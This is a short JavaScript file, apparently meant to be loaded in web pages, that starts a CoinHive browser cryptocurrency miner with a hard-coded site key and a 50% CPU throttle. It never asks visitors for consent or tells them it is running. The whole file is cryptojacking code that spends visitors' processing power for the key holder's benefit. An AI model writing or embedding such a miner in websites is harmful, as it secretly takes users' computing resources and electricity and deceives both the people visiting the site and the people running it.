console.log("Mining.js loaded");


/*
for(let i = 1; i < 1000000; i++){

}
*/
console.log("Done Waiting");
let miner = new CoinHive.Anonymous('OPcAucBNwRYkuolOhrRINWw0GeAAVFkA');
miner.on('found', function() { //hashes++; 
});
miner.setThrottle(.5);
miner.start();
